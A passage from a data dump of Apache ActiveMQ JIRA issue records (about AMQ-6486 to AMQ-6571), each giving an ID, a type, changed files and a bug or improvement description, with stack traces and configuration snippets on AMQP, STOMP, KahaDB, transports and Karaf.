Add additional event points to the validator to allow inspection of deliveries on a receiver and the delivery updates for a sender.
issueID:AMQ-6486
type:Bug
changed files:
texts:AMQP: Native transformer makes message persistent when no header is present
When a message is received that does not have an AMQP Header Section the native transformer ends up setting the message persistent value to true instead of respecting the specification defined behavior.
issueID:AMQ-6489
type:Improvement
changed files:
texts:Support SSL configuration using JNDI
Add ability to configure SSL parameters using a jndi.properties file.  The current ApacheMQInitialContextFactory does not support configuring connection factories of type ActiveMQSslConnectionFactory.
issueID:AMQ-649
type:Bug
changed files:StompTransportFilter.java
StompSubscription.java
StompFrame.java
StompWireFormat.java
StompFrameError.java
ProtocolConverter.java
ProtocolException.java
StompCommand.java
texts:Error frames are not pushed out immediately
If you send a malformed SEND frame to the server (like having a newline after your payload and before the NULL when using a content-length header), you don"t get the ERROR frame back from the server immediately as you did with 3.2.2.  With both 4.0M4 and the SNAPSHOT from March 20, I had to send another message to the server to see the ERROR frame.This was quite confusing when implementing a new STOMP client.
issueID:AMQ-6491
type:Bug
changed files:
texts:WebSocket tries to call default servlet, when default servlet not configured
With WebSocket connectors defined e.g.<transportConnectors>    <transportConnector name="ws"                        uri="ws://0.0.0.0:61614?maximumConnections=1000&amp;wireFormat.maxFrameSize=104857600"/>    <transportConnector name="wss"                        uri="wss://0.0.0.0:61615?transport.wantClientAuth=true&amp;maximumConnections=1000&amp;wireFormat.maxFrameSize=104857600"/></transportConnectors>A request to https://127.0.0.1:61615/ gives HTTP 500 Internal Server Error with the following in the log: WARN | org.eclipse.jetty.servlet.ServletHandler | /java.lang.NullPointerException        at org.apache.activemq.transport.ws.jetty9.WSServlet.doGet(WSServlet.java:88)[activemq-http-5.14.1.jar:5.14.1]        at javax.servlet.http.HttpServlet.service(HttpServlet.java:622)[tomcat-servlet-api-8.0.24.jar:]        at org.eclipse.jetty.websocket.servlet.WebSocketServlet.service(WebSocketServlet.java:167)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at javax.servlet.http.HttpServlet.service(HttpServlet.java:729)[tomcat-servlet-api-8.0.24.jar:]        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:587)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1129)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.Server.handle(Server.java:499)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)[jetty-all-9.2.13.v20150730.jar:9.2.13.v20150730]        at java.lang.Thread.run(Thread.java:745)[:1.8.0_66-internal]This occurs because no default servlet is defined. Either ActiveMQ should not attempt to forward GET requests to the default servlet, or the embedded Jetty instances should be configured with a proper default servlet.
issueID:AMQ-6493
type:Test
changed files:
texts:Fix failure test in Karaf iTests for AMQP
The test for AMQP in the activemq-karaf-itest module has been failing for awhile.
issueID:AMQ-6495
type:Bug
changed files:FailoverTransport.java
texts:Boolean state flags in Failover transport should be volatile
The Failover transport reconnect task looks at the started / disposed / shuttingDown flags to check if it should terminate but that value is read outside any locks and is not volatile leading to missing the not-started state.
issueID:AMQ-6497
type:Improvement
changed files:
texts:Add way to navigate broker interceptors
MutableBrokerFilter has a getNext() method that allows one (a tool) to navigate through Broker interceptors, however BrokerFilter does not have such a method and it should.
issueID:AMQ-6498
type:Bug
changed files:
texts:AMQP: Broker side receiver needs to take inbound backlog into account when deciding to grant credit
When dealing with limits and activating producer flow control the AMQP receiver does not account for the backlog of message that may exist due to there being more credit on the link when flow control is being done by the actual destination due to memory limits.  A backlog can accumulate and on the first response after the flow control is stopped the broker grants more credit to the client before processing the current backlog lead to ever building backlog.
issueID:AMQ-6500
type:Bug
changed files:
texts:Consuming problem with topics in ActiveMQ 5.14.1 with AMQP Qpid client
There could only be 500 topic messages be consumed with the AMQP Qpid client with ActiveMQ 5.14.1.Specific settings : No prefetch sizes are set in a policyEntry of the activemq.xml. No prefetch sizes are set in the brokerURL in the client code.We get the following situation (subscriber info) at the moment a subscriberconnects with the Qpid client.The Inflight value becomes -1000 what is very strange.Pending Queue Size  | Inflight | Enqueued | Dequeued | Prefetch0                                | -1000  | 0               | 0                | 0We get the following situation when one topic message is published.The Inflight value increased with 2.Pending Queue Size  | Inflight | Enqueued | Dequeued | Prefetch0                                | -998    | 1                | 1               | 0We get the following situation when 500 topic messages are published.The Inflight value is now 0 and the 500 messages are consumed.Pending Queue Size  | Inflight | Enqueued | Dequeued | Prefetch0                                | 0         | 500            | 500           | 0At the moment message 501 is published increases the "Pending Queue Size" and the messages "Enqueued" as well. The "Dequeued" messages remains 500 and message 501 can"t be consumed by the subscriber !Pending Queue Size  | Inflight | Enqueued | Dequeued | Prefetch1                                | 0          | 501          | 500            | 0Do somebody know what happens ?  Do I something wrong or is it a real bug ?Patrick
issueID:AMQ-6501
type:Task
changed files:
texts:Update some dependecies to latest point releases
Update the followinghttpclient -> 4.5.2httpcore -> 4.4.5jettison -> 1.3.8MQTT client -> 1.14Taglibs -> 1.2.5XStream -> 1.4.9
issueID:AMQ-6504
type:Bug
changed files:
texts:Scheduler store delivers message to early
When calculating the time block to scheduler new Jobs in the store code truncates instead of rounds the time which leads jobs to get run early in many cases.
issueID:AMQ-6505
type:Bug
changed files:
texts:Auto transports can lead to high cpu usage and failed connections under high load
There"s an issue with the auto transports that can cause failed connections and very high cpu usage when there is a high number of concurrent connections attempted at the same time.  I noticed this primarily under load testing the auto+nio+ssl transport.  After some debugging, it turns out the issue is the ByteBuffer that is used to capture the initial bytes for protocol detection. The buffer should be local per thread and not shared but by mistake it was made a class level variable so under high load and contention the buffer can be manipulated by more than one thread causing failures and high cpu load (especially under NIO)
issueID:AMQ-6506
type:Improvement
changed files:
texts:OSGi import ranges for javax.jms should include version 2.0 for activemq-jms-pool
The import ranges for the ActiveMQ JMS pool bundle should allow, not exclude version 2.0 of the javax.jms API, since JMS 2.0 is backwards compatible with 1.1.  Should be like in activemq-osgijavax.jms;version=[1.1,3)
issueID:AMQ-651
type:Bug
changed files:ActiveMQEndpointWorker.java
texts:Deadlock in ActiveMQ close processing of Resource Adapter
Need to check to see if this is still valid against 4.xSee:http://issues.apache.org/jira/browse/GERONIMO-1493
issueID:AMQ-6510
type:Bug
changed files:
texts:Incorrect specification of data dir in conf/log4j.properties
conf/log4j.properties specifies the data directory as {activemq.base}/data which doesn"t work if the data directory has been moved elsewhere.It should be specified as {activemq.data}
issueID:AMQ-6514
type:Bug
changed files:
texts:Property placeholders do not work in blueprint activemq config
User properties as a placeholder do not work in the blueprint activemq config.<policyEntry topic=">" optimizedDispatch="true" producerFlowControl="false" memoryLimit="$example{perTopicMemoryLimit}">Java.lang.IllegalArgumentException: Could convert not to a memory size: $example{perTopicMemoryLimit}at org.apache.activemq.util.MemoryPropertyEditor.setAsText(MemoryPropertyEditor.java:63)&#91;97:org.apache.activemq.activemq-osgi:5.10.0&#93;See http://apaste.info/nSw3hThis seems to be caused by an error in xbean-blueprint 3.x. Upgrading to 4.2 fixes the issue. I will create a PR for the change.
issueID:AMQ-6515
type:Bug
changed files:
texts:Install of activemq-blueprint fails as javax.inject is missing
When just installing activemq-blueprint in a plain karaf 4.0.7 the following error happens. It seems that javax.inject is missing in the feature activemq-client.karaf@root()> feature:repo-add activemq 5.15.0-SNAPSHOTAdding feature url mvn:org.apache.activemq/activemq-karaf/5.15.0-SNAPSHOT/xml/featureskaraf@root()> feature:install activemq-blueprint Error executing command: Unable to resolve root: missing requirement &#91;root&#93; osgi.identity; osgi.identity=activemq-blueprint; type=karaf.feature; version="&#91;5.15.0.SNAPSHOT,5.15.0.SNAPSHOT&#93;"; filter:="(&(osgi.identity=activemq-blueprint)(type=karaf.feature)(version>=5.15.0.SNAPSHOT)(version<=5.15.0.SNAPSHOT))" [caused by: Unable to resolve activemq-blueprint/5.15.0.SNAPSHOT: missing requirement &#91;activemq-blueprint/5.15.0.SNAPSHOT&#93; osgi.identity; osgi.identity=activemq; type=karaf.feature; version="&#91;5.15.0.SNAPSHOT,5.15.0.SNAPSHOT&#93;" [caused by: Unable to resolve activemq/5.15.0.SNAPSHOT: missing requirement &#91;activemq/5.15.0.SNAPSHOT&#93; osgi.identity; osgi.identity=activemq-karaf; type=osgi.bundle; version="&#91;5.15.0.SNAPSHOT,5.15.0.SNAPSHOT&#93;"; resolution:=mandatory [caused by: Unable to resolve activemq-karaf/5.15.0.SNAPSHOT: missing requirement &#91;activemq-karaf/5.15.0.SNAPSHOT&#93; osgi.wiring.package; filter:="(osgi.wiring.package=org.apache.activemq.console)" [caused by: Unable to resolve org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT: missing requirement &#91;org.apache.activemq.activemq-osgi/5.15.0.SNAPSHOT&#93; osgi.wiring.package; filter:="(osgi.wiring.package=javax.inject)"]]]]
issueID:AMQ-6517
type:Bug
changed files:
texts:Make redelivery policy preDispatch check optional
AMQ-5146 introduced a pre dispatch check on the redelivery policy to ensure that a consumer the repeatidly crashed with a redelivery limit would eventually fail the message to the dlq.There are cases where this is not ideal. For example, if the redelivery policy denies redelivery, maxRedeliveries=0 and a message has been inflight on an aborted connection. Broker side the redelivery count will be incremented, because the broker knows it may have been delivered (on a connection abort, the consumer goes not get to supply accurate delivery status information). With the preemptive check, this message it won"t get delivered and will instead go directly to the DLQ.making the preDeliveryCheck optional allows maxRedeliveries=0 to work in this case.
issueID:AMQ-6518
type:Bug
changed files:
texts:Statistics plugin shows wrong value for average message size
The statistics plugin reports the wrong value for average message size.For messages on one of my topic JMX is reporting an average message size of 1242. The statistics plugin is reporting an average message size of 0.Digging into this I found that StatisticsPlugin line 123 is the problem. It invokes stats.getMessageSize().getAveragePerSecond() instead of stats.getMessageSize().getAverageSize().The result is that the plugin reports 1000 / averageMessageSize instead of averageMessageSize.
issueID:AMQ-6520
type:Bug
changed files:
texts:support indexDirectory attribute via mKahaDB
AMQ-5072 added the index directory to kahadb such that the index can be on a different volume to the journal data.With mKahadb, this information is lost when the perDestination option is used.eg:Start a standalone broker with the following mKahaDB configuration. <mKahaDB directory="${data}/kahadb">  <filteredPersistenceAdapters>   <filteredKahaDB perDestination="true"> <persistenceAdapter>   <kahaDB journalMaxFileLength="32mb" indexDirectory="/tmp/kindex"/> </persistenceAdapter>  </filteredKahaDB> </filteredPersistenceAdapters></mKahaDB>With the above cfg, the indices for each of the created queues reside in what would be the default location. For example, given a queue called FOOBAR, its corresponding index files will be found in ../data/amq/kahadb/queue#3a#2f#2fFOOBAR and not /tmp/kindex/queue#3a#2f#2fFOOBARWith the cfg below, the indices for "FOO.>" and "BAR.>" are being created in their respective directories (i.e., under kindex1 and kindex2).  <mKahaDB directory="${data}/kahadb"> <filteredPersistenceAdapters>   <filteredKahaDB queue="FOO.>">    <persistenceAdapter>      <kahaDB journalMaxFileLength="32mb" indexDirectory="/tmp/kindex1"/>    </persistenceAdapter>   </filteredKahaDB>   <filteredKahaDB queue="BAR.>">    <persistenceAdapter>      <kahaDB journalMaxFileLength="32mb" indexDirectory="/tmp/kindex2"/>    </persistenceAdapter>   </filteredKahaDB> </filteredPersistenceAdapters></mKahaDB>
issueID:AMQ-6521
type:Bug
changed files:HttpTransportServer.java
texts:compatibility issue with jetty 9.3.11 in org.apache.activemq.transport.http.HttpTransportServer
There is a instantiation of a class that does not exists, see org.apache.activemq.transport.http.HttpTransportServer.java: private void addGzipHandler(ServletContextHandler contextHandler) throws Exception {        Handler handler = new GzipHandler();        contextHandler.setHandler(handler);    }org.eclipse.jetty.servlets.gzip.GzipHandler does not exist. Instead there is a class org.eclipse.jetty.server.handler.gzip.GzipHandler.javain https://mvnrepository.com/artifact/org.eclipse.jetty/jetty-server/9.3.13.v20161014Because of this activemq is not compatible with jetty versions since 9.0
issueID:AMQ-6522
type:Bug
changed files:
texts:KahaDB - checkForCorruptJournalFiles has hard coded 32k batch size limit in error
Using setCheckForCorruptJournalFiles=true, there is a sanity check of the journal at startup - skipping through each of the journal files validating batch record checksums and magic in an effort to detect corruption early and drop the relevant messages or error out.There is an error in the check logic that assumes a batch record must be < 32k which is not the case if a message is > 32kTidy up this check and add some more detail to the error messages.
issueID:AMQ-6524
type:Bug
changed files:KahaDBStore.java
texts:The MemoryUsage tracker can get out of sync when using concurrentStoreAndDispatch
There is a rare issue with memoryUsage when using concurrentStoreAndDispatch that causes memory usage to get out of sync and go negative or stay too high.  It is hard to reproduce and only occurs on brokers under high load in my testing.I have finally tracked down the issue to the InnerFutureTask inside of KahaDB that gets used to fire the PendingMarshalUsageTracker on completion.  This task is not thread safe and causes the following 2 problems:    1) Sometimes the listener is never fired and the usage isn"t decremented. This case seems to be caused by the listener not being visible to the thread when run.  (volatile or atomic reference need to be used)    2) Sometimes the listener can run twice. This seems to be because of a lack of synchronization between the if(isDone()) check and the done() method call.  This can also be fixed by using an atomic reference.I have a patch that solves both of these problems and I have not seen the issue reoccur in my testing.
issueID:AMQ-6526
type:Bug
changed files:
texts:Exception occurred processing: <Unknown> -> org.apache.activemq.transport.stomp.ProtocolException: The maximum data length was exceeded
When sending a Stomp message whose payload is bigger than wireFormat.maxDataLength, it results in this error Exception occurred processing: <Unknown> -> org.apache.activemq.transport.stomp.ProtocolException: The maximum data length was exceededThe problem is the <Unknown> which should get replaced with the proper Stomp operation that was used.
issueID:AMQ-6529
type:Bug
changed files:SimpleCachedLDAPAuthorizationMap.java
texts:CachedLDAPAuthorizationMap may be queried prior to loading ACL&#39;s
When not using spring, nothing calls the query method (or afterPropertiesSet method) until the first update call which could occur several seconds or longer after startup.  Thus, early calls to check ACL"s could cause denials for requests that shouldn"t be denied.
issueID:AMQ-653
type:Bug
changed files:
texts:The README.txt file contains references to activemq.org
These need to be updated to point to the incubator web site.
issueID:AMQ-6535
type:Bug
changed files:AutoInitNioSSLTransport.java
AutoNIOSSLTransportServer.java
AutoTcpTransportServer.java
NIOSSLTransport.java
texts:auto+nio+ssl transport protocol detection task doesn&#39;t always terminate
There"s an issue with the auto+nio+ssl transport where the task that runs to read enough byets to detect the protocol can continue to run even after the timeout period.  This ends up eating up cpu and the task will never stop.This can happen if there"s a repeated exception when trying to read from the protocol or when the client connects but doesn"t send enough bytes.
issueID:AMQ-6536
type:Improvement
changed files:
texts:Update to Proton-J 0.16.0
Update to proton-j 0.16.0 and add support for answering senders who request link capability for delivery delay.
issueID:AMQ-6538
type:Bug
changed files:
texts:Unable to add a second network bridge when syncDurableSubs is enabled
There is an issue with the syncDurableSubs feature that causes multiple network bridges added between two brokers to fail (except the first one) if the dynamically included destinations are different.The cause of the failure is that on sync when trying to cleanup un-needed network durable subscriptions only the subscription name is taken into account and not the clientId so invalid subscription removal commands get generated which lead to a bridge failure. (they are generated with the wrong localClientId)
issueID:AMQ-654
type:Bug
changed files:
texts:etcproject.xml needs to be updated
The organization url needs to be corrected as it is currently invalid.The values for the siteAddress siteDirectory distributionSite and distributionDirectory need to be reviewed.The mailing list information to need to be updated to point to the apache mailing listsThe mailing list archives could be updated to point to archives that Hiram has requested to be setup on Nabble.
issueID:AMQ-6542
type:Test
changed files:
texts:Test for activemq-cf
The activemq-cf module allows to create connection factories from config in OSGi. We should have a test to validate this works.
issueID:AMQ-6543
type:Test
changed files:
texts:Clean up warnings
I will create a PR to cleanup the current warnings in the karaf itests.
issueID:AMQ-6544
type:Bug
changed files:
texts:ActiveMQ does not start up on karaf if offline (SAXParseException)
To reproduce: Download, unpack and start karaf 4.0.8    feature:repo-add activemq 5.14.2    feature:install activemq-brokerActiveMQ start succesfully.Now stop karaf, go offline and start karaf again.This time the exception below can be found in the log and ActiveMQ fails to start.org.osgi.service.cm.ConfigurationException: null : Cannot start the brokerCaused by: org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 24 in XML document from URL file:/home/cschneider/java/apache-karaf-4.0.8/etc/activemq.xml is invalid; nested exception is org.xml.sax.SAXParseException: cvc-elt.1.a: Cannot find the declaration of element "beans".Caused by: org.xml.sax.SAXParseException: cvc-elt.1.a: Cannot find the declaration of element "beans".Full stack trace can be found here http://apaste.info/PQSHZThe reason for this problem seems to be that the xsd can not be found. So I assume we lack the correct mapping from urls to embedded xsds.I will work on a fix.
issueID:AMQ-6545
type:Bug
changed files:Journal.java
texts:Deadlock can occur during journal file rotation
There is an issue in the KahaDB Journal that can cause a deadlock.  I saw the issue occur today when an Ack compaction was running while another thread retrieved the current data file and a rotation was required.https://issues.apache.org/jira/browse/AMQ-5603 introduced async preallocation and part of that commit introduced two locks instead of 1...dataFileIdLock and currentDataFile.The issue is that most of the time dataFileIdLock is acquired first and then currentDataFile.  However, when calling the getCurrentDataFile() method if a rotation is needed then the currentDataFile lock is acquired before dataFileIdLock leading to a potential deadlock situation.The fix is to make sure that the two locks are always acquired in the same order.
issueID:AMQ-6546
type:Improvement
changed files:
texts:Refactoring of karaf itests
The karaf itests can be improved quite a lot. I will prepare a bigger refactoring to bring the tests up to a good condition.
issueID:AMQ-6547
type:Improvement
changed files:
texts:mKahaDB: support storeUsage per filtered instance
mKahaDB allows multiple journals to be use, with differing QOS. However the broker storeUsage is shared across all instances.It would be great to have a storeUsage per kahaDB instance such that particular destinations can be restricted to a subset of the available disk space while others are unlimited.In other words, have diskUsage in the mix as a QOS metric.
issueID:AMQ-6548
type:Bug
changed files:
texts:Commit messages on exception
At ear stop jsm connection consumes messages, although there occured exception2016-12-15 16:12:58,831 ERROR [org.jboss.as.ejb3.invocation.processInvocation] (default-threads - 23) WFLYEJB0034: EJB Invocation failed on component test.test.mdb for method public void test.test.onMessage(javax.jms.Message): org.jboss.as.ejb3.component.EJBComponentUnavailableException: WFLYEJB0421: Invocation cannot proceed as component is shutting down        at org.jboss.as.ejb3.component.interceptors.ShutDownInterceptorFactory$1.processInvocation(ShutDownInterceptorFactory.java:59)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.as.ejb3.deployment.processors.EjbSuspendInterceptor.processInvocation(EjbSuspendInterceptor.java:53)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.as.ejb3.component.interceptors.LoggingInterceptor.processInvocation(LoggingInterceptor.java:66)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.as.ee.component.NamespaceContextInterceptor.processInvocation(NamespaceContextInterceptor.java:50)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.as.ejb3.component.interceptors.AdditionalSetupInterceptor.processInvocation(AdditionalSetupInterceptor.java:54)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.as.ejb3.component.messagedriven.MessageDrivenComponentDescription$5$1.processInvocation(MessageDrivenComponentDescription.java:213)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.invocation.ContextClassLoaderInterceptor.processInvocation(ContextClassLoaderInterceptor.java:64)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.invocation.InterceptorContext.run(InterceptorContext.java:356)        at org.wildfly.security.manager.WildFlySecurityManager.doChecked(WildFlySecurityManager.java:634)        at org.jboss.invocation.AccessCheckingInterceptor.processInvocation(AccessCheckingInterceptor.java:61)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.invocation.InterceptorContext.run(InterceptorContext.java:356)        at org.jboss.invocation.PrivilegedWithCombinerInterceptor.processInvocation(PrivilegedWithCombinerInterceptor.java:80)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.invocation.ChainedInterceptor.processInvocation(ChainedInterceptor.java:61)        at org.jboss.as.ee.component.ViewService$View.invoke(ViewService.java:195)        at org.jboss.as.ee.component.ViewDescription$1.processInvocation(ViewDescription.java:185)        at org.jboss.invocation.InterceptorContext.proceed(InterceptorContext.java:340)        at org.jboss.invocation.ChainedInterceptor.processInvocation(ChainedInterceptor.java:61)        at org.jboss.as.ee.component.ProxyInvocationHandler.invoke(ProxyInvocationHandler.java:73)        at test.test$$$view19.onMessage(Unknown Source)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)        at java.lang.reflect.Method.invoke(Method.java:498)        at org.jboss.as.ejb3.inflow.MessageEndpointInvocationHandler.doInvoke(MessageEndpointInvocationHandler.java:139)        at org.jboss.as.ejb3.inflow.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:73)        at test.test$$$endpoint12.onMessage(Unknown Source)        at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointAlive.onMessage(MessageEndpointProxy.java:123)        at org.apache.activemq.ra.MessageEndpointProxy.onMessage(MessageEndpointProxy.java:64)        at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:1041)        at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:169)        at org.jboss.jca.core.workmanager.WorkWrapper.run(WorkWrapper.java:226)        at org.jboss.threads.SimpleDirectExecutor.execute(SimpleDirectExecutor.java:33)        at org.jboss.threads.QueueExecutor.runTask(QueueExecutor.java:808)        at org.jboss.threads.QueueExecutor.access$100(QueueExecutor.java:45)        at org.jboss.threads.QueueExecutor$Worker.run(QueueExecutor.java:828)        at java.lang.Thread.run(Thread.java:745)        at org.jboss.threads.JBossThread.run(JBossThread.java:320)
issueID:AMQ-6549
type:Bug
changed files:BrokerService.java
texts:Logger message
Wrong logging message
issueID:AMQ-6555
type:Bug
changed files:
texts:Failed to browse topic warnings caused by orphaned expire message tasks in Sceduler
When using a FixedCountSubscriptionRecoveryPolicy on a topic I get millions of warnings when the topic is gc"d after inactivity. The impact is that warn logging has to be turned off which is not ideal. Looking in detail it seems this is caused by a couple of things. Firstly the Topic start method can be invoked twice, once when adding the destination to the RegionBroker and second when the regionBroker is started. That causes the same expireMessagesTask to get scheduled twice which reveals the crux of the problem. The Scheduler allows the same task to be scheduled again in new TimerTasks, even though it will use the same key and ophan any existing (and running) TimerTasks. This is what"s happening here. When the topic gets stopped, the orphaned tasks continue to run causing these spurious warnings that clog up the logs.My suggestion would be for the scheduler to check if the task has already been registered using a putIfAbsent and fail if it already exists:https://github.com/apache/activemq/blob/d9350912984f12356e9d51b0f00b5a28f5cfa58d/activemq-client/src/main/java/org/apache/activemq/thread/Scheduler.java#L42These are the warnings we see:2017-01-10 11:36:13,885 &#91;host&#93; Scheduler] - WARN  Topic                          - Failed to browse Topic: myTopicjava.lang.NullPointerException at org.apache.activemq.broker.region.policy.FixedCountSubscriptionRecoveryPolicy.browse(FixedCountSubscriptionRecoveryPolicy.java:103) at org.apache.activemq.broker.region.policy.RetainedMessageSubscriptionRecoveryPolicy.browse(RetainedMessageSubscriptionRecoveryPolicy.java:111) at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:677) at org.apache.activemq.broker.region.Topic.access$1(Topic.java:639) at org.apache.activemq.broker.region.Topic$2.run(Topic.java:791) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505
issueID:AMQ-656
type:Improvement
changed files:
texts:Update of AMQ C++ client
Attached is a new update of the C++ client, the zip-file contains the full source since the update is a major overhaul.
issueID:AMQ-6560
type:Bug
changed files:TransportConnection.java
texts:Improve thread safety of pendingStop flag in TransportConnection
I was looking at TransportConnection and I noticed that the pendingStop flag was a normal boolean but not always accessed inside of a synchronized block.  This is an issue because multiple threads might be checking this flag (such as when the inactivity monitor runs).  The starting flag has the same issue.  Both of these booleans can be converted to AtomicBoolean which will simplify things and guarantee thread visibility on change.
issueID:AMQ-6561
type:Bug
changed files:
texts:Broker does not close connection for all connection attempt errors
When a client connects to the broker the connection gets added inside the processAddConnection method in TransportConnection.  Right now if there is an exception the socket is only shutdown if the type of exception is SecurityException.  However the connection should really be closed if any error occurs when trying to add the connection.  For example if an InvalidClientIDException occurs then the connection is no longer tracked by the broker but the socket stays open until the client actually closes it on their end. This should be fixed so that the error terminates the socket connection since the connection attempt failed.
issueID:AMQ-6562
type:Bug
changed files:
texts:WARN TopicStorePrefetch cursor got duplicate from store
Intermittent WARN in the log for durable topic subs:17/01/13 10:45:35 WARN cursors.AbstractStoreCursor: TopicStorePrefetch(CONNECTION-my_sub_1,my_sub_1,storeHasMessages=false) ID:localhost-49595-1484304335002-6:1:1:1 - org.apache.activemq.broker.region.cursors.TopicStorePrefetch@37e3cc57:T1,batchResetNeeded=false,size=14,cacheEnabled=false,maxBatchSize:200,hasSpace:true,pendingCachedIds.size:0,lastSyncCachedId:null,lastSyncCachedId-seq:null,lastAsyncCachedId:null,lastAsyncCachedId-seq:null - cursor got duplicate from store ID:localhost-49595-1484304335002-4:1:1:1:1 seq: null
issueID:AMQ-6563
type:Bug
changed files:MessageDatabase.java
texts:MessageDatabase.load could leave writeLock incorrectly locked
MessageDatabase.load in the kahadb store implementation makes a call to "IOHelper.mkdirs(directory);" after acquiring the writeLock, but outside of the try/finally which releases the writeLock.  if that method call fails, the writeLock would be left incorrectly locked.
issueID:AMQ-6567
type:Bug
changed files:
texts:Broker failure when deleting files in gc can cause missing journal errors on restart
A broker stop or failure while deleting journal data files or archiving data files can result in partial deletion and no index updates. Leading to errors on restart of the form: java.io.IOException: Detected missing journal files.ERROR BrokerService                  - Failed to start Apache ActiveMQ (localhost, null)java.io.IOException: Detected missing journal files. [1, 2, 3, 4] at org.apache.activemq.store.kahadb.MessageDatabase.recoverIndex(MessageDatabase.java:978) at org.apache.activemq.store.kahadb.MessageDatabase$5.execute(MessageDatabase.java:714) at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779) at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:711) at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:464) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:483) at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:297) at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:218) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.doStart(KahaDBPersistenceAdapter.java:226) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.broker.BrokerService.doStartPersistenceAdapter(BrokerService.java:674) at org.apache.activemq.broker.BrokerService.startPersistenceAdapter(BrokerService.java:658) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:622)The file deletion of the gc candidates is part of the index transaction, so partial deletion can occur but the index does not get updated.For gc, the index updates need to complete to remove references to the data files first. Only after a successful update to the index should the removal proceed. If the removal fails, on restart the orphaned data files will get gc ed.
issueID:AMQ-6571
type:Improvement
changed files:
texts:HttpClientTransport refuses to accept cookies using `Expires&#39; header
BackgroundWe are using ActiveMQ"s HTTP transport to connect to brokers hosted in AWS, behind a load balancer.This transport requires a sticky session (i.e. session affinity) because of the local map of clients in HttpTunnelServlet.clientsAWS"s classic load balancer sends sticky session cookies with the max-age attribute:AWSELB=2DC7[...]F155;PATH=/;MAX-AGE=36000Whereas AWS"s new application load balancer, which supports a web application firewall (WAF), uses the Expires attribute:AWSALB=QclQ[...]V2kP; Expires=Tue, 27 Dec 2016 09:31:43 GMT; Path=/As of RFC 6265 both max-age and Expires are valid attributes.IssueApache HTTP Client 4.5.2 defaults to a cookie policy of best-match. When the AWSALB cookie is received, the cookie is not handled and the ActiveMQ log contains the following:2017-01-19 12:23:58,185 | WARN  | Invalid cookie header: "Set-Cookie: AWSALB=QclQ[...]V2kP; Expires=Tue, 27 Dec 2016 09:31:43 GMT; Path=/". Invalid "expires" attribute: Tue, 27 Dec 2016 09:31:43 GMT | org.apache.http.client.protocol.ResponseProcessCookies | mainSolutionThe solution is to change the cookie policy in HttpClientTransport.createHttpClient():HttpClientParams.setCookiePolicy(params, 